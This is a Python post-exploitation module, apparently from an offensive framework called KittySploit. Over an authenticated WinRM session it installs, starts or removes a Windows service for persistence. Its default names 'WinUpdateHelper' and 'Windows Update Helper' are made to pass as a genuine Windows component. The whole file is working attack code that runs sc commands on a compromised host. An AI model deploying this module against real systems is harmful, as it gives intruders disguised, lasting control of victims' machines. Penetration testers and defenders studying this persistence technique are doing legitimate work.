#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Persistence Service",
		"description": "Create, start, or remove a Windows service for persistence via WinRM",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1543.003/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "persistence"],
			"expected_requests": 3,
			"reversible": True,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["persistence"],
				"suggested_followups": [],
			},
		},
	}

	service_name = OptString("WinUpdateHelper", "Service name", True)
	display_name = OptString("Windows Update Helper", "Service display name", False)
	bin_path = OptString("", "Path to service binary / command", True)
	start_type = OptChoice("auto", "Service start type", False, choices=["auto", "demand", "disabled"])
	start_now = OptBool(True, "Start the service after creation", False)
	remove = OptBool(False, "Stop and delete the service instead", False)

	def run(self):
		try:
			name = str(self.service_name or "").strip()
			if not name:
				raise ProcedureError(FailureType.ConfigurationError, "service_name is required")

			if bool(self.remove):
				print_status(f"Stopping and deleting service '{name}'...")
				self.cmd_execute(f'sc stop "{name}"')
				out = self.cmd_execute(f'sc delete "{name}"') or ""
				print_info(out.strip() or "(no output)")
				print_success("Service removal requested")
				return True

			bin_path = str(self.bin_path or "").strip()
			if not bin_path:
				raise ProcedureError(FailureType.ConfigurationError, "bin_path is required")

			display = str(self.display_name or name).strip()
			start = str(self.start_type or "auto").lower()
			create_cmd = (
				f'sc create "{name}" binPath= "{bin_path}" start= {start} '
				f'DisplayName= "{display}"'
			)
			print_status(f"Creating service '{name}'...")
			print_info(create_cmd)
			out = self.cmd_execute(create_cmd) or ""
			print_info(out.strip() or "(no output)")

			if bool(self.start_now):
				print_status("Starting service...")
				start_out = self.cmd_execute(f'sc start "{name}"') or ""
				print_info(start_out.strip() or "(no output)")

			print_success("Service persistence installed")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM service persistence error: {exc}")
